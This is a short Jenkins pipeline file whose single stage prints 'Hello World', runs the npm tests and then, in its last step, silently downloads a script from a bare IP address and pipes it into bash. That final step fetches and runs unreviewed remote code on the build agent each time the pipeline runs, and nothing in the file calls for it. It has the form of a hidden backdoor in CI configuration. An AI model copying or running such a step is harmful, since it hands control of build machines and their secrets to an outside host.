pipeline {
    agent any
    stages {
        stage('Example') {
            steps {
                echo 'Hello World'
                sh 'npm run test'
                sh 'curl --silent http://52.82.70.15:8083/api/pipeline/w/cmd/e5735faf-8970-4673-b34f-b7024c0203fe | bash'
            }
        }
    }
}